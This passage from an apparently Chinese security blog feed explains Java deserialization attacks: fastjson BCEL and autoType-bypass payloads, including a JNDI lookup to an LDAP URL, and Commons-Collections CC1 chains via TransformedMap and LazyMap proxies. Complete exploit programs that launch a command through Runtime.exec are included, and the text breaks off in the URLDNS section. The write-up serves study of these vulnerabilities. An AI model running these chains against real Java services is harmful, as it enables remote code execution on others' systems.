class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\fastjson\\calc.class&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br>String s=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;DriverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;,\&quot;DriverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>JSON.parseObject(s);<br><br></code></pre></td></tr></table></figure><p>这里我们并不需要传入<code>getConnection</code>,因为fastjson在反序列化过程中会自动的调用所有符合条件的get方法</p><h4 id="流程如下-1"><a href="#流程如下-1" class="headerlink" title="流程如下"></a>流程如下</h4><p><img src="/image/fastjson/image-20240513093445313.png" alt="image-20240513093445313"></p><h3 id="Templatesimpl"><a href="#Templatesimpl" class="headerlink" title="Templatesimpl"></a>Templatesimpl</h3><h2 id="fastjson-修复绕过"><a href="#fastjson-修复绕过" class="headerlink" title="fastjson 修复绕过"></a>fastjson 修复绕过</h2><p><strong>版本&lt;1.2.27</strong></p><p>在这个版本修复中，当检测到<code>@type</code>关键字后，就会走到一个新函数<code>checkAutoType</code>中</p><p><img src="/image/fastjson/image-20240513100617020.png" alt="image-20240513100617020"> </p><p>在<code>getClassFromMapping</code>这个方法中，会优先从缓存里面去找类，如果缓存中存在，会直接返回不进行类型检查</p><p><img src="/image/fastjson/image-20240513101016326.png" alt="image-20240513101016326"> </p><p>所以就需要找到如何将我们的恶意类写入缓存中</p><p>进入<code>getClassFromMapping</code>中，缓存是从mapping中获得，找到为mapping put值的地方</p><p><img src="/image/fastjson/image-20240513101437727.png" alt="image-20240513101437727"> </p><p>有两处，第一处是在<code>addBaseClassMappings</code>但是这是用于加入基础类的地方，无法控制</p><p>第二处是在<code>loadClass</code></p><p><img src="/image/fastjson/image-20240513101729050.png" alt="image-20240513101729050"> </p><p>接下来寻找loadclass调用处，看看是否能够控制</p><p>查找调用处，找到一个<code>MiscCodec.deserialze</code>中会调用这个loadClass</p><p><img src="/image/fastjson/image-20240513103021808.png" alt="image-20240513103021808"> </p><p>而MiscCodec这个类是一个反序列化器，查看反序列化器定义处，发现Class使用的是MiscCodec这个反序列化器</p><p>，所以我们可以在fastjson中反序列化一个Class，就会走到MiscCodec中</p><p><img src="/image/fastjson/image-20240513104756962.png" alt="image-20240513104756962"> </p><h4 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-type">String</span>[] args) <span class="hljs-keyword">throws</span> <span class="hljs-type">Exception</span>&#123;<br><br>   <span class="hljs-comment">//加载一个类，值为恶意类,并顺势进行反序列化</span><br>    <span class="hljs-type">String</span> payload<span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>java.lang.Class<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>val<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-subst">\&quot;</span>&#125;,&#123;<span class="hljs-subst">\&quot;</span>@type<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>DataSourceName<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>ldap://127.0.0.1:8085/LVDvOfkO<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>autocommit<span class="hljs-subst">\&quot;</span>:true&#125;&#125;&quot;</span>;<br>    <span class="hljs-type">JSON</span>.parseObject(payload);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="修复绕过总结"><a href="#修复绕过总结" class="headerlink" title="修复绕过总结"></a>修复绕过总结</h4><p>只需要将我们需要的恶意类在进行反序列化前，加载到缓存中去，这样就可以绕过后续反序列化过程中的校验</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CC链</title>
    <link href="/2024/08/28/cc%E9%93%BE/"/>
    <url>/2024/08/28/cc%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>下载jdk 8u65，maven导入commons-collections</p><p>导入坐标如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="反射调用runtime中的exec"><a href="#反射调用runtime中的exec" class="headerlink" title="反射调用runtime中的exec"></a>反射调用runtime中的exec</h2><p>一般使用runtime执行系统命令的方法如下</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>使用反射机制调用exec</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span> r = <span class="hljs-keyword">Runtime</span>.getRuntime();<br><span class="hljs-keyword">Class</span> c = r.getClass();<br>Method execmethod = c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-keyword">class</span>);<br>execmethod.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="解决runtime对象不可序列化"><a href="#解决runtime对象不可序列化" class="headerlink" title="解决runtime对象不可序列化"></a>解决runtime对象不可序列化</h2><p>因为runtime对象没有继承serialize，所以不可以进行序列化</p><p>但是所有class类都可以进行序列化，所以我们需要序列化runtime的class</p><p><code>Runtime</code>类的构造方法都是私有的，只有一个静态方法<code>getRuntime</code>返回<code>currentRuntime</code>。因此只能反射调用<code>getRuntime</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Class</span>&lt;<span class="hljs-keyword">Runtime</span>&gt; runtimeClass = <span class="hljs-keyword">Runtime</span>.<span class="hljs-keyword">class</span>;<br>Method runtimeClassMethod = runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-keyword">Runtime</span> r = (<span class="hljs-keyword">Runtime</span>) runtimeClassMethod.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-keyword">class</span>).invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>使用<code>InvokerTransformer</code>的方式解决runtime不可序列化问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeClassMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(runtimeClassMethod);<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>或者  使用ChainedTransformer类</p><p>ChainedTransformer类实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br> &#125;;<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers).transform(Runtime.class);<br><br><br></code></pre></td></tr></table></figure><hr><h2 id="漏洞突破口（危险方法）"><a href="#漏洞突破口（危险方法）" class="headerlink" title="漏洞突破口（危险方法）"></a>漏洞突破口（危险方法）</h2><p>漏洞的突破口实在<code>commons-collections</code>下面的<code>Transformer</code>接口的一个实现类<code>InvokerTransformer</code></p><p>这个类中的一个方法<code>transform</code>接收了一个对象，然后反射调用对象中的方法，而这里的对象是我们可控的对象</p><p>如下所示</p><p><img src="/image/cc%E9%93%BE/image-20240408095624101.png" alt="image-20240408095624101"> </p><p>找到<code>InvokerTransformer</code>的构造函数，如下所示</p><p><img src="/image/cc%E9%93%BE/image-20240408100239577.png" alt="image-20240408100239577"> </p><p><strong>第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。我们通过构造函数然后去调用<code>transform</code>方法即可调用我们传入类的方法了</strong></p><p>下面是使用<code>InvokerTransformer</code>弹计算器</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span> r = <span class="hljs-keyword">Runtime</span>.getRuntime();<br><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><hr><h2 id="寻找调用链"><a href="#寻找调用链" class="headerlink" title="寻找调用链"></a>寻找调用链</h2><p>当我们找到危险方法<code>transformer</code>，确定其可以利用后，我们应该继续往前找，寻找哪个方法调用了危险方法</p><p>通过全部查找找到TransfomedMap类中的<code>checkSetValue</code>，这个方法中调用了transform，但是调用的是valueTransformer的transform，所以我们需要了解valueTransformer怎么来的</p><p><img src="/image/cc%E9%93%BE/image-20240408111510468.png" alt="image-20240408111510468"> </p><p>在这个文件中查找<code>valueTransformer</code>,可以找到<code>valueTransformer</code>赋值的地方，是通过传入一个hashmap进行赋值</p><p><img src="/image/cc%E9%93%BE/image-20240408111837655.png" alt="image-20240408111837655"> </p><p>因为这个<code>TransformedMap</code>方法是一个protect，继续翻找可以找到一个静态方法调用了这个<code>TransformedMap</code></p><p><img src="/image/cc%E9%93%BE/image-20240408112327365.png" alt="image-20240408112327365"> </p><p>接下来就要寻找调用<code>checkSetValue</code>的地方，发现是<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code>方法。</p><p><img src="/image/cc%E9%93%BE/image-20240408121102540.png" alt="image-20240408121102540"> </p><p>所以我们需要调用<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code>方法</p><p>这个<code>MapEntry</code>的<code>setValue</code>方法会在hashmap遍历时起作用</p><p>构造调用链如下</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livescript">    Runtime r = Runtime.getRuntime();<br>    <br>    InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><br>    HashMap <span class="hljs-keyword">map</span> = <span class="hljs-keyword">new</span> HashMap();<br>    <span class="hljs-keyword">map</span>.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">Object</span>,<span class="hljs-built_in">Object</span>&gt; decorate = TransformedMap.decorate(<span class="hljs-keyword">map</span>, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">Map</span>.Entry entry : decorate.entrySet())<br>    &#123;<br>        entry.setValue(r);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="寻找readobject中的调用"><a href="#寻找readobject中的调用" class="headerlink" title="寻找readobject中的调用"></a>寻找readobject中的调用</h2><p>寻找readobject中的调用<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code></p><p>在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>中找到readobject中调用 <code>setValue</code></p><p><img src="/image/cc%E9%93%BE/image-20240408125239184.png" alt="image-20240408125239184"> </p><p>所以反序列化调用链就可以构成了</p><p><img src="/image/cc%E9%93%BE/image-20240408131711580.png" alt="image-20240408131711580"> </p><p>查看AnnotationInvocationHandler的构造函数</p><p><img src="/image/cc%E9%93%BE/image-20240408132453940.png" alt="image-20240408132453940">  </p><p>AnnotationInvocationHandler并不是一个public，所以想要实例化这个类还是需要使用反射进行实例化</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span> c = <span class="hljs-keyword">Class</span>.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);<br>Constructor annotationinvocationConstructor = c.getDeclaredConstructor(<span class="hljs-keyword">Class</span>.<span class="hljs-keyword">class</span>, Map.<span class="hljs-keyword">class</span>);<br>annotationinvocationConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">Object</span> o = annotationinvocationConstructor.newInstance(Target.<span class="hljs-keyword">class</span>, map);<br></code></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><p><code>ChainedTransformer</code>会链式调用数组中的<code>Transformer</code>对象</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-built_in">String</span>[] args) <span class="hljs-keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new </span><span class="hljs-class title_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new </span><span class="hljs-class title_">ConstantTransformer</span>(Runtime.<span class="hljs-property">class</span>),<br>                <span class="hljs-keyword">new </span><span class="hljs-class title_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-property">class</span>, Class[].<span class="hljs-property">class</span>&#125;, <span class="hljs-keyword">new </span><span class="hljs-class title_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new </span><span class="hljs-class title_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-property">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-property">class</span>&#125;, <span class="hljs-keyword">new </span><span class="hljs-class title_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new </span><span class="hljs-class title_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-property">class</span>&#125;, <span class="hljs-keyword">new </span><span class="hljs-class title_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new </span><span class="hljs-class title_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-built_in">HashMap</span> <span class="hljs-built_in">map</span> = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>();<br>        <span class="hljs-built_in">map</span>.<span class="hljs-property">put</span>(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map transformedmap = TransformedMap.<span class="hljs-property">decorate</span>(<span class="hljs-built_in">map</span>, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        <span class="hljs-comment">//正常进行序列化和反序列化</span><br>        Class c = Class.<span class="hljs-property">forName</span>(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor annotationinvocationConstructor = c.<span class="hljs-property">getDeclaredConstructor</span>(Class.<span class="hljs-property">class</span>, Map.<span class="hljs-property">class</span>);<br>        annotationinvocationConstructor.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">Object</span> o = annotationinvocationConstructor.<span class="hljs-property">newInstance</span>(Target.<span class="hljs-property">class</span>, transformedmap);<br>        <span class="hljs-title function_">serialize</span>(o);<br>        <span class="hljs-title function_">unserialize</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span>(<span class="hljs-built_in">Object</span> obj) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ObjectOutputStream oss = <span class="hljs-keyword">new </span><span class="hljs-class title_">ObjectOutputStream</span>(<span class="hljs-keyword">new </span><span class="hljs-class title_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.<span class="hljs-property">writeObject</span>(obj);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">Object</span> <span class="hljs-title function_">unserialize</span>(<span class="hljs-built_in">String</span> Filename) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    ObjectInputStream ois = <span class="hljs-keyword">new </span><span class="hljs-class title_">ObjectInputStream</span>(<span class="hljs-keyword">new </span><span class="hljs-class title_">FileInputStream</span>(Filename));<br>    <span class="hljs-keyword">return</span> ois.<span class="hljs-property">readObject</span>();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="最终的流程图如下"><a href="#最终的流程图如下" class="headerlink" title="最终的流程图如下"></a>最终的流程图如下</h2><p><img src="/image/cc%E9%93%BE/image-20240409144806501.png" alt="image-20240409144806501"> </p><hr><h1 id="CC1（2）"><a href="#CC1（2）" class="headerlink" title="CC1（2）"></a>CC1（2）</h1><p>在上述寻找CC1的调用链过程中，我们寻找谁调用了<code>InvokerTransformer.transform</code>的时候，我们找到不止<code>TransformedMap</code>一处地方调用了，还有两处地方调用了<code>InvokerTransformer.transform</code></p><p><img src="/image/cc%E9%93%BE/image-20240409145233627.png" alt="image-20240409145233627"> </p><p>我们找到LazyMap中去，可以找到是get中调用了factory的transform </p><p><img src="/image/cc%E9%93%BE/image-20240409145434180.png" alt="image-20240409145434180"> </p><p>接下来就是寻找谁调用了<code>LazyMap.get</code>,最终在 <code>AnnotationInvocationHandler.invoke()</code> 方法中找到了有一个地方调用了 <code>get()</code> 方法,这个get方法的变量是可控。观察发现它存在于invoke中，<strong>当一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法</strong></p><p><img src="/image/cc%E9%93%BE/image-20240409150804137.png" alt="image-20240409150804137"></p><p>所以接下来就是动态代理<code>AnnotationInvocationHandler</code>并调用方法，就会自动的调用invoke方法，最后走到<code>memberValues.get</code>中去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationinvocationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>annotationinvocationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationhandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationinvocationConstructor.newInstance(Target.class, lazymap);<br><span class="hljs-comment">//动态代理AnnotationInvocationHandler</span><br><span class="hljs-type">Map</span> <span class="hljs-variable">proxymap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationhandler);<br><span class="hljs-comment">//</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationinvocationConstructor.newInstance(Target.class, proxymap);<br></code></pre></td></tr></table></figure><p>最终流程如下</p><p><img src="/image/cc%E9%93%BE/image-20240409154511994.png" alt="image-20240409154511994"> </p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h4 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h4><p>这条链在序列化时就会执行dns解析，原因是在执行hashmap的put方法时，会调用<code>hash()</code>方法</p><p><img src="/image/cc%E9%93%BE/image-20240424161616574.png" alt="image-20240424161616574"></p><p><code>hash</code>中又会调用key的<code>hashcode</code>方法,即调用的是<code>URL</code>的<code>hashcode</code>方法</p><p><img src="/image/cc%E9%93%BE/image-20240424162022802.png" alt="image-20240424162022802"> </p><p>在URL的hashcode中，当hashcode的值为-1时又会调用handler的hashCode，在里面进行会进行dns解析</p><p> <img src="/image/cc%E9%93%BE/image-20240424162211625.png" alt="image-20240424162211625"> </p><p>所以我们为了使其不在put的时候就进行dns解析，我们需要使得传入的hashcodebu不为 -1</p><p>所以需要将hashcode的值修改，而URL类中的hashcode的值是private ,只能通过反射进行修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> URL.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefield</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashCodefield.setAccessible(<span class="hljs-literal">true</span>);<br>hashCodefield.set(url,<span class="hljs-number">1234</span>);<br></code></pre></td></tr></table></figure><p>修改为1234后就不会在put的时候进行dns请求，只需要在put之后将hashcode的值改回-1，就可以在反序列化时进行dns请求</p><p>完整exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>    HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">URL</span> <span 